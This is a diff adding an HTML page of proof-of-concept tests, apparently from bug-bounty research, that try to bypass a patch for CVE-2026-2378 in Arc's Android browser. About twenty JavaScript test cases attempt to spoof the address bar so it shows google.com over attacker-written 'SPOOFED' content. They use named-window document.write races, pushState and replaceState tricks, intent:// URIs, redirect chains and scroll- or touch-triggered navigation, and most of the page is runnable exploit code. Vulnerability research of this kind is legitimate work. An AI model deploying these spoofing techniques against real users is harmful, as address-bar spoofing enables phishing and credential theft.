@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2026-2378 Bypass Tests</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, system-ui, sans-serif; padding: 16px; background: #111; color: #eee; }
+        h2 { margin-bottom: 16px; font-size: 18px; }
+        .test { background: #1a1a2e; border: 1px solid #333; border-radius: 10px; padding: 14px; margin: 10px 0; }
+        .test h3 { color: #7f5af0; font-size: 14px; margin-bottom: 6px; }
+        .desc { color: #888; font-size: 12px; line-height: 1.5; margin-bottom: 10px; }
+        button { width: 100%; padding: 12px; background: #7f5af0; color: #fff; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; margin: 3px 0; }
+        button:active { background: #6b46e5; }
+        .warn { color: #e53170; font-size: 11px; }
+        .server { color: #2cb67d; font-size: 11px; }
+        input { width: 100%; padding: 10px; background: #2a2a3e; color: #eee; border: 1px solid #444; border-radius: 6px; font-size: 14px; margin: 8px 0; }
+    </style>
+</head>
+<body>
+
+<h2>CVE-2026-2378 Bypass — Arc Android</h2>
+
+<div style="margin-bottom:12px;">
+    <label style="font-size:12px;color:#888;">Server URL (for server-side tests):</label>
+    <input type="text" id="server" value="" placeholder="https://your-server.com (optional)">
+</div>
+
+<!-- ============================================ -->
+<!-- CATEGORY A: URL-Freeze Variants              -->
+<!-- Previous $5K bug used 204. Try other codes.  -->
+<!-- ============================================ -->
+
+<div class="test">
+    <h3>A1. 205 Reset Content (204 variant)</h3>
+    <p class="desc">204 was patched. Try 205 Reset Content — same "no body" behavior
+    but different status code. Fix might only check for 204 specifically.</p>
+    <p class="server">Requires server: /205-reset endpoint</p>
+    <button onclick="testServer('/205-reset')">Test 205</button>
+</div>
+
+<div class="test">
+    <h3>A2. 202 Accepted</h3>
+    <p class="desc">202 indicates the request was accepted but not yet processed.
+    Some implementations treat it similarly to 204.</p>
+    <button onclick="testServer('/202-accepted')">Test 202</button>
+</div>
+
+<div class="test">
+    <h3>A3. 304 Not Modified</h3>
+    <p class="desc">304 tells the browser to use cached content. If there's no cache,
+    the page might stay on the previous URL with empty content.</p>
+    <button onclick="testServer('/304-not-modified')">Test 304</button>
+</div>
+
+<div class="test">
+    <h3>A4. Hanging response (0-byte body)</h3>
+    <p class="desc">Send 200 OK with Content-Length: 0 but keep connection open.
+    Browser thinks page loaded but there's no content to replace the URL bar.</p>
+    <button onclick="testServer('/zero-body')">Test 0-byte</button>
+</div>
+
+<div class="test">
+    <h3>A5. Redirect to same page with fragment</h3>
+    <p class="desc">302 redirect back to the SAME URL with a # fragment.
+    Fragment navigation doesn't trigger full page load but may affect omnibar.</p>
+    <button onclick="testA5()">Test Fragment Redirect</button>
+</div>
+
+<!-- ============================================ -->
+<!-- CATEGORY B: Android Intent Schemes           -->
+<!-- Android-specific navigation paths            -->
+<!-- ============================================ -->
+
+<div class="test">
+    <h3>B1. intent:// URI Navigation</h3>
+    <p class="desc">Android intent:// URIs can trigger app navigation. If the omnibar
+    updates based on intent handling, it might show a spoofed URL during the transition.
+    Similar to iOS geo: scheme bug but Android-specific.</p>
+    <button onclick="testB1()">Test intent://</button>
+</div>
+
+<div class="test">
+    <h3>B2. market:// and play store schemes</h3>
+    <p class="desc">market:// triggers Play Store. During the handoff between Arc and
+    Play Store, the omnibar state might become inconsistent.</p>
+    <button onclick="testB2()">Test market://</button>
+</div>
+
+<div class="test">
+    <h3>B3. Android deep link race</h3>
+    <p class="desc">Navigate to a URL that's also registered as an Android App Link.
+    The disambiguation dialog between browser and app may freeze the omnibar.</p>
+    <button onclick="testB3()">Test Deep Link</button>
+</div>
+
+<!-- ============================================ -->
+<!-- CATEGORY C: History / Back Button            -->
+<!-- Android back button = unique attack surface  -->
+<!-- ============================================ -->
+
+<div class="test">
+    <h3>C1. pushState + back button race</h3>
+    <p class="desc">pushState to google.com, then immediately trigger back navigation.
+    During the back animation, the omnibar might flash the pushState URL.</p>
+    <button onclick="testC1()">Test pushState + Back</button>
+</div>
+
+<div class="test">
+    <h3>C2. Multiple pushState then navigate</h3>
+    <p class="desc">Push 100 history entries, then navigate to google.com.
+    The history stack overflow might confuse the omnibar's URL tracking.</p>
+    <button onclick="testC2()">Test History Flood</button>
+</div>
+
+<div class="test">
+    <h3>C3. replaceState during page transition</h3>
+    <p class="desc">Start navigation to google.com, then replaceState during beforeunload.
+    The omnibar might show the replaceState URL instead of the destination.</p>
+    <button onclick="testC3()">Test replaceState + Navigate</button>
+</div>
+
+<!-- ============================================ -->
+<!-- CATEGORY D: Window / Tab Manipulation        -->
+<!-- Named windows, popups, tab switching          -->
+<!-- ============================================ -->
+
+<div class="test">
+    <h3>D1. window.open + location.replace race</h3>
+    <p class="desc">Open google.com in named window, then rapidly replace with attacker content.
+    The named window reuse might cause the omnibar to keep google.com.</p>
+    <button onclick="testD1()">Test Named Window</button>
+</div>
+
+<div class="test">
+    <h3>D2. window.open then postMessage navigation</h3>
+    <p class="desc">Open a window, then use postMessage to tell the opened page to navigate.
+    Indirect navigation might bypass omnibar update checks.</p>
+    <button onclick="testD2()">Test postMessage Nav</button>
+</div>
+
+<div class="test">
+    <h3>D3. Popup + close + reopen race</h3>
+    <p class="desc">Open google.com, close it, then immediately reopen with attacker content
+    using the same window name. The closed window's URL might persist.</p>
+    <button onclick="testD3()">Test Close/Reopen</button>
+</div>
+
+<!-- ============================================ -->
+<!-- CATEGORY E: Download / MIME Type Tricks      -->
+<!-- ============================================ -->
+
+<div class="test">
+    <h3>E1. Content-Disposition download interrupt</h3>
+    <p class="desc">Navigate to a URL that starts downloading a file (Content-Disposition: attachment).
+    The download dialog might freeze the omnibar on the previous URL.</p>
+    <button onclick="testServer('/download-interrupt')">Test Download</button>
+</div>
+
+<div class="test">
+    <h3>E2. PDF inline display</h3>
+    <p class="desc">Navigate from google.com to a PDF with Content-Disposition: inline.
+    The PDF viewer might display while the omnibar still shows the previous URL.</p>
+    <button onclick="testServer('/pdf-inline')">Test PDF</button>
+</div>
+
+<!-- ============================================ -->
+<!-- CATEGORY F: Redirect Chain Edge Cases        -->
+<!-- ============================================ -->
+
+<div class="test">
+    <h3>F1. Redirect loop with limit</h3>
+    <p class="desc">20 redirects in a chain (near browser limit). When the browser
+    stops following redirects, the omnibar might show an intermediate URL.</p>
+    <button onclick="testServer('/redirect-loop?n=20')">Test 20 Redirects</button>
+</div>
+
+<div class="test">
+    <h3>F2. Meta refresh + JS redirect combo</h3>
+    <p class="desc">Page with both meta refresh AND JS redirect to different URLs.
+    The competing navigations might confuse the omnibar.</p>
+    <button onclick="testF2()">Test Dual Redirect</button>
+</div>
+
+<div class="test">
+    <h3>F3. 307 POST redirect to GET</h3>
+    <p class="desc">Submit a form via POST, server returns 307 redirect. The method
+    change from POST to GET during redirect might affect omnibar handling.</p>
+    <button onclick="testF3()">Test 307 Redirect</button>
+</div>
+
+<!-- ============================================ -->
+<!-- CATEGORY G: Scroll / Gesture Based           -->
+<!-- CVE says "after user interaction"            -->
+<!-- ============================================ -->
+
+<div class="test">
+    <h3>G1. Scroll-triggered navigation</h3>
+    <p class="desc">CVE mentions "after user interaction". What if scrolling triggers
+    the navigation? The omnibar hides on scroll in Arc Android — if we navigate
+    during scroll, the hidden omnibar might update incorrectly.</p>
+    <button onclick="testG1()">Test Scroll Trigger</button>
+</div>
+
+<div class="test">
+    <h3>G2. Pull-to-refresh race</h3>
+    <p class="desc">During pull-to-refresh animation, navigate to a different URL.
+    The refresh indicator + navigation might cause the omnibar to show wrong URL.</p>
+    <button onclick="testG2()">Setup Pull-to-Refresh Test</button>
+</div>
+
+<div class="test">
+    <h3>G3. Touch event + pushState</h3>
+    <p class="desc">On touchstart, do pushState to google.com URL. On touchend, navigate
+    away. The omnibar might briefly show google.com during the touch.</p>
+    <button onclick="testG3()">Setup Touch Test</button>
+</div>
+
+<script>
+const TARGET = 'https://www.google.com/';
+const FAKE = '<html><body style="font-family:arial;padding:40px;background:#fff;"><h1 style="color:red;font-size:36px;">SPOOFED</h1><p>Address bar should show google.com</p></body></html>';
+
+function getServer() {
+    return document.getElementById('server').value.replace(/\/$/, '');
+}
+
+function testServer(path) {
+    const s = getServer();
+    if (!s) {
+        alert('Enter server URL first (run server.py on a VPS or use ngrok)');
+        return;
+    }
+    // First open google, then redirect to our server endpoint
+    let w = window.open(TARGET, '_blank');
+    setTimeout(() => {
+        try { w.location.href = s + path; } catch(e) {}
+    }, 2000);
+}
+
+// A5: Fragment redirect
+function testA5() {
+    // Navigate to google.com#test — fragment change doesn't trigger full nav
+    let w = window.open(TARGET, '_blank');
+    setTimeout(() => {
+        try {
+            // Change fragment rapidly
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    try { w.location.hash = '#spoof' + i; } catch(e) {}
+                }, i * 10);
+            }
+        } catch(e) {}
+    }, 1500);
+}
+
+// B1: intent:// URI
+function testB1() {
+    let w = window.open(TARGET, 'g');
+    setTimeout(() => {
+        // intent:// that falls back to web URL
+        try {
+            w.location.href = 'intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;S.browser_fallback_url=https%3A%2F%2Fgoogle.com;end';
+        } catch(e) {}
+    }, 2000);
+
+    // Also try direct intent
+    setTimeout(() => {
+        try {
+            window.open('intent://www.google.com#Intent;scheme=https;action=android.intent.action.VIEW;end', 'g');
+        } catch(e) {}
+    }, 3000);
+}
+
+// B2: market:// scheme
+function testB2() {
+    let w = window.open(TARGET, 'g');
+    setTimeout(() => {
+        try { w.location.href = 'market://details?id=com.google.android.gm'; } catch(e) {}
+    }, 2000);
+}
+
+// B3: Android deep link
+function testB3() {
+    let w = window.open(TARGET, 'g');
+    setTimeout(() => {
+        // YouTube deep link — might trigger app chooser dialog
+        try { w.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; } catch(e) {}
+    }, 2000);
+}
+
+// C1: pushState + back
+function testC1() {
+    // Push a google.com-like URL to history
+    history.pushState({}, 'Google', '/search?q=test');
+    // Trigger back
+    setTimeout(() => history.back(), 50);
+}
+
+// C2: History flood
+function testC2() {
+    for (let i = 0; i < 100; i++) {
+        history.pushState({i: i}, '', '/page' + i);
+    }
+    // Now navigate to google
+    setTimeout(() => {
+        window.location.href = TARGET;
+    }, 100);
+}
+
+// C3: replaceState during navigation
+function testC3() {
+    window.addEventListener('beforeunload', () => {
+        try {
+            history.replaceState({}, 'Spoofed', 'https://www.google.com/spoofed');
+        } catch(e) {}
+    });
+    // Navigate to a different page
+    window.location.href = 'about:blank';
+}
+
+// D1: Named window race
+function testD1() {
+    window.open(TARGET, 'g');
+    // Rapid-fire replace
+    [500, 1000, 1500, 2000, 2500].forEach(t => {
+        setTimeout(() => {
+            try {
+                let w = window.open('about:blank', 'g');
+                if (w) {
+                    w.document.open();
+                    w.document.write(FAKE);
+                    w.document.close();
+                }
+            } catch(e) {}
+        }, t);
+    });
+}
+
+// D2: postMessage navigation
+function testD2() {
+    let w = window.open(TARGET, '_blank');
+    // Can't postMessage to google.com cross-origin, but try anyway
+    setTimeout(() => {
+        try {
+            w.postMessage({navigate: 'about:blank'}, '*');
+        } catch(e) {}
+        // Fallback: direct navigation
+        try {
+            w.location.href = 'about:blank';
+            setTimeout(() => {
+                try {
+                    w.document.open();
+                    w.document.write(FAKE);
+                    w.document.close();
+                } catch(e) {}
+            }, 100);
+        } catch(e) {}
+    }, 2000);
+}
+
+// D3: Close + reopen
+function testD3() {
+    let w = window.open(TARGET, 'g');
+    setTimeout(() => {
+        try { w.close(); } catch(e) {}
+        setTimeout(() => {
+            let w2 = window.open('about:blank', 'g');
+            try {
+                w2.document.open();
+                w2.document.write(FAKE);
+                w2.document.close();
+            } catch(e) {}
+        }, 100);
+    }, 2000);
+}
+
+// F2: Dual redirect
+function testF2() {
+    let w = window.open('about:blank', '_blank');
+    try {
+        w.document.open();
+        w.document.write(`<html>
+        <head>
+            <meta http-equiv="refresh" content="1;url=https://www.google.com/">
+        </head>
+        <body>
+            <script>
+                setTimeout(function() {
+                    window.location.href = 'https://www.bing.com/';
+                }, 800);
+            <\/script>
+            ${FAKE}
+        </body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+
+// F3: 307 redirect via form POST
+function testF3() {
+    let s = getServer();
+    if (!s) { alert('Need server URL'); return; }
+    let f = document.createElement('form');
+    f.method = 'POST';
+    f.action = s + '/307-redirect';
+    f.target = '_blank';
+    document.body.appendChild(f);
+    f.submit();
+    document.body.removeChild(f);
+}
+
+// G1: Scroll-triggered navigation
+function testG1() {
+    let w = window.open('about:blank', '_blank');
+    try {
+        w.document.open();
+        w.document.write(`<html><body style="height:5000px;font-family:arial;padding:20px;">
+        <h1>Scroll down to trigger</h1>
+        <p>The page will navigate when you scroll past 500px</p>
+        <div style="position:fixed;top:10px;right:10px;background:red;color:white;padding:8px;border-radius:4px;" id="status">Scroll: 0</div>
+        <script>
+            let triggered = false;
+            window.addEventListener('scroll', function() {
+                document.getElementById('status').textContent = 'Scroll: ' + window.scrollY;
+                if (window.scrollY > 500 && !triggered) {
+                    triggered = true;
+                    // Navigate while omnibar is hidden (Arc hides on scroll down)
+                    history.pushState({}, 'Google', 'https://www.google.com/');
+                    document.getElementById('status').textContent = 'TRIGGERED - check omnibar!';
+                    document.body.innerHTML = '<div style="padding:40px"><h1 style="color:red">SPOOFED</h1><p>Omnibar should show google.com while scrolled</p></div>';
+                }
+            });
+        <\/script>
+        </body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+
+// G2: Pull-to-refresh
+function testG2() {
+    let w = window.open('about:blank', '_blank');
+    try {
+        w.document.open();
+        w.document.write(`<html><body style="font-family:arial;padding:20px;min-height:200vh;">
+        <h1>Pull down to refresh</h1>
+        <p>When you pull to refresh, the page will navigate during the refresh animation.</p>
+        <script>
+            // Detect pull-to-refresh by watching for overscroll
+            let refreshing = false;
+            window.addEventListener('beforeunload', function() {
+                if (!refreshing) {
+                    refreshing = true;
+                    history.replaceState({}, 'Google', 'https://www.google.com/');
+                }
+            });
+
+            // Also try navigation event interception
+            if (window.navigation) {
+                navigation.addEventListener('navigate', function(e) {
+                    // During refresh, try to intercept
+                    if (!refreshing) {
+                        refreshing = true;
+                        e.intercept({
+                            handler() {
+                                document.body.innerHTML = '<h1 style="color:red">SPOOFED during refresh</h1>';
+                                return new Promise(r => setTimeout(r, 5000));
+                            }
+                        });
+                    }
+                });
+            }
+        <\/script>
+        </body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+
+// G3: Touch event + pushState
+function testG3() {
+    let w = window.open('about:blank', '_blank');
+    try {
+        w.document.open();
+        w.document.write(`<html><body style="font-family:arial;padding:20px;">
+        <h1>Tap anywhere on this page</h1>
+        <p>On touch, pushState changes URL to google.com.</p>
+        <div id="status" style="margin-top:20px;padding:12px;background:#f0f0f0;border-radius:8px;"></div>
+        <script>
+            document.addEventListener('touchstart', function(e) {
+                try {
+                    history.pushState({}, 'Google', 'https://www.google.com/search?q=test');
+                    document.getElementById('status').innerHTML = '<b style="color:red">pushState fired!</b> Check omnibar.';
+                    document.title = 'Google';
+                } catch(err) {
+                    document.getElementById('status').innerHTML = 'pushState failed: ' + err.message;
+                    // Fallback: try replaceState
+                    try {
+                        history.replaceState({}, 'Google', '/search?q=test');
+                        document.getElementById('status').innerHTML += '<br>replaceState to /search succeeded!';
+                    } catch(e2) {}
+                }
+            });
+
+            document.addEventListener('touchend', function() {
+                // On release, navigate away
+                setTimeout(function() {
+                    window.location.href = 'about:blank';
+                }, 2000);
+            });
+        <\/script>
+        </body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+</script>
+
+</body>
+</html>
